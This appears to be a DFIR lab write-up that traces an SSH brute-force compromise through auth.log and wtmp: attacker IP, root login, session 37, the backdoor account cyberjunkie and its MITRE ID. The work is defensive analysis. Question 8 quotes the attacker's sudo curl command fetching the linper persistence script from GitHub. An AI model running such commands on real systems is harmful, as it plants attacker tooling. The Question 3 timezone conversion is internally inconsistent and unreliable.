
## Scenario:

A brute-force attack hit an SSH service, and the attacker eventually guessed the `root` password. After logging in interactively, they established a shell session, created a new local user for persistence, added that user to the sudo group, and then used elevated privileges to download a script from GitHub for further activity.

## Artificats provided:

Via `sha256sum Brutus.zip`, dd7742375a19b6ccc4323058224460a5220c43d4e9f7565b653bd369b8c46b2d 

## Skills learned:

- Unix Log Analysis
- wtmp analysis

## Initial Analysis:

The two artifacts that are provided are the auth logs and WTMP output. 

##### auth.log:

auth.log is a plain-text authentication log on Unix/Linux systems that records security-related events such as SSH logins, failed password attempts, user creation, privilege changes, and sudo command execution.

- It is commonly used in DFIR to trace brute-force activity, successful logins, privilege escalation, persistence, and post-exploitation actions.
    - You can inspect it with tools like `cat`, `grep`, `less`, or `awk`
    - Common filters include `Failed password`, `Accepted password`, `useradd`, `usermod`, `sudo`, and `COMMAND`


##### **wtmp**:

wtmp is a binary log file that records all login and logout sessions on Unix/Linux system, as well as system reboots and failed logins. 
- This comes in a binary format, so you must use the last `tool` to display the login/logout history `last -f /var/log/wtmp`-
- You can also view it in different ways, via python3, which you will see shortly.	  
	


## Tools utilized:

- 7z
- python3

I had issues with using unzip as seen below. It was skipping the auth.log and wtmp logs. 

![[Pasted image 20261022120135.png]]


Instead I had to use the command, `7z x Brutus.zip` which worked and gave me the files I needed. 

![[Pasted image 20261022120141.png]]

Since wtmp is a binary file, it's not directly readable like auth.log. I can run python3 with utmp.py against wtmp to get wtmp.out, which then can be analyzed with cat or less command.

```
python3 utmp.py -o wtmp.out wtmp
```


![[Pasted image 20261022120158.png]]

![[Pasted image 20261022120159.png]]
## Analyzing auth.log:

When using the cat command against the auth.logs, a lot of information is given. Linux commands will come in handy while trying to navigate through everything to get the answers I need.

![[Pasted image 20261022120209.png]]

#### Question 1:
##### Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

To identify for brute force attacker's IP address, I analyzed the auth.log for repeated failed authentication attempts using the following commands:

```
# Step 1: Find all failed attempts
grep "Failed password\|invalid user" auth.log | head

# Step 2: Extract just the IPs if needed to compare
grep "Failed password\|invalid user" auth.log | grep -oP '(?<=from )\S+' | head

# Step 3: Count and sort
grep "Failed password\|invalid user" auth.log | grep -oP '(?<=from )\S+' | sort | uniq -c | sort -rn
```

**Step 3** command breakdown:
1. Filters auth.log for failed login attempts
2. Extracts IP address using regex pattern matching
3. Counts occurrences of each IP
4. Sorts by frequency to identify the source of the brute force attack


*Methodology*:  
I searched `auth.log` for repeated failed SSH authentication attempts, focusing on the patterns `Failed password` and `invalid user`. To isolate the source address, I extracted the IP following `from`, then counted occurrences to see which address appeared most often.


*Result*:
The repeated failed logins all point to the same source IP: `65.2.161.68`.

![[Pasted image 20261022120222.png]]


*Answer*:  
`65.2.161.68`

*Analysis*:  
A brute-force attack produces many rapid failures from one host, usually against multiple usernames or passwords. In this log, the high volume of `Failed password` / `invalid user` entries from a single IP is the clearest indicator of automated password guessing. That source stands out as the attacker’s origin.


#### Question 2:
##### The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
   
*Methodology*:
To identify successful authentications from the attacker's IP(65.2.161.68), I searched for "Accepted password" entries in auth.log and filtered by the attacker's IP.

grep "Accepted password" auth.log | grep "65.2.161.68" | grep -oP '(?<=for )\S+' | sort | uniq -c | sort -rn

*Result*: 
2 root
1 cyberjunkie

*Answer*: root

*Analysis*: The root account shows 2 successful authentications from the attacker's IP address, indicating successful compromise of the most privileged user account on the system. This gives the attacker unrestricted admin access. Bruteforcing tools are a software program or script designed to attempt all possible combinations of characters or values to find a correction solution, typically used in the context of password cracking or cryptography. An example of bruteforcing tools: Brutus!

#### Question 3
##### Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
   

We see the authentication time for 06:32:44, but the question guides us to the wtmp artifact. The wtmp artifact will provide a time when the attacker had an interactive terminal connected. Entries in the wtmp record provider records of the creation and destruction of terminals, as well as the assignment and release of terminals to users. 

![[Pasted image 20261022120242.png]]


```
cat wtmp.out | grep "65.2.161.68"
```

![[Pasted image 20261022120253.png]]


And converting this to UTC I get 2024-03-06 06:32:45.


*Methodology*:
Analyzed wtmp.out for LOGIN entries from attacker IP 65.2.161.68:

```
cat wtmp.out | grep "65.2.161.68"
```

*Finding*:
The wtmp artifact displayed: 2024/03/05 00:32:45
After accounting for system timezone offset: 2024-03-06 06:32:45

*Answer*: 2024-03-06 06:32:45

*Note*: The original wtmp file was created in a timezone 6 hours behind UTC. After conversion to UTC format (hyphens, adjusted time): 2024-03-06 06:32:45

*Side note*: If you are using your own OS to perform these analysis, you can switch your computer to UTC time. That way, in the future when providing data for a write up, it will be already converted for you!


#### Question 4
**SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**
   

*Methodology*:
I searched auth.log for successful root authentication and the associate session:

```
grep "Accepted password.*root" auth.log -A 3
```

*Findings*:
Three session entries appear:
1. 06:19:54 - Session 6. Different IP of 203.101.190.9(not the attackers of 65.2.161.68)
2. 06:31:40 - Automated brute force tool (failed, closed immediately)
3. 06:32:44 - Successful manual authentication (Matches Q2 timeline)

*Answer*: 37

*Evidence:*
The log entry shows: 
"Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root."

This corresponds to the successful brute force attack from 65.2.161.68 identified in Questions 1-2. 

#### Question 5
**The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**


*Methodology:*

I searched for the auth.log for user creation and modification commands that indiciate persistence mecahisms. Examples are: useradd, usermod, groupadd.

```
grep "useradd\|usermod" auth.log
```


![[Pasted image 20261022120315.png]]

*Findings*: 
Two persistence-related actions were identified:

1. User Creation (06:34:18):
   - Command: useradd
   - Details: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash
2. Privilege Escalation (06:35:15):
   - Command: usermod
   - Action: add 'cyberjunkie' to group 'sudo'

*Timeline*: 
The account was created at 06:34:18 and immediately added to the sudo group at 06:35:15 (within 1 minute), indicating intentional prvilege escalation by the attack.

*Answer*: cyberjunkie

*Analysis*:
By creating a user account with sudo privileges, the attacker ensured they could maintain admin access even if the compromised root password was changed. This is a classic persistence technique-creating a "backdoor" account with elevated privilges. 

#### Question 6
##### What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

At this point, a new user account was created as a method of achieving persistence. Per, https://attack.mitre.org/, there are three sub-techniques  Persistence > Create Account: Local, Domain and Cloud. The account "cyberjunkie" was created using the local useradd command, per evidence: 

- **useradd** command
	- Local system command that creates users in /etc/passwd and /etc/shadwo files on local machine
- **UID=1002,GID=1002**
	- User ID's in the 1000+ range = local user(not domain/network user). Root is UID 0, system users are 1-999.
- **home=/home/cyberjunkie**
	- Home directory created locally on filesystem
- **shell=/bin/bash**
	- Local shell assignment

![[Pasted image 20261022120330.png]]


![[Pasted image 20261022120336.png]]



*MITRE ATT&CK Mapping:*
- Tactic: Persistence
- Technique: Create Account (T1136)
- Sub-Technique: Local Account (T1136.001)

*Answer*: T1136.001

#### Question 7
**What time did the attacker's first SSH session end according to auth.log?**

*Methodlogy*:
I searched auth.log for the session closure event for Session 37:

```
grep "Session 37" auth.log
```

*Finding*: 
```
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
```

*Answer:*
2024-03-06 06:37:24

*Timeline Analysis:*
Session 37 Duration: 06:32:44 - 06:37:24 

**During this interactive session, the attacker:**
- Created persistence account (cyberjunkie) at 06:34:18
- Escalated privileges for the account at 06:35:15
- Executed post-exploitation commands (Question 8)
- Cleanly disconnected at 06:37:24
  
#### Question 8
##### The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

*Methodology*:
I searched auth.log for sudo commands to identify post-exploitation activities:

grep "sudo\|COMMAND" auth.log

*Finding*:
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

*Analysis*:
The attacker used curl to download a linux privilege escalation/persistence script from a Github repository. Going to the script, you can see the various signs of what it's intended to do.

![[Pasted image 20261022120349.png]]


*Forensic Significance*:
This command represents the final stage of the attack-deploying post-exploitation tools to deepen system compromise and ensure persistent access. 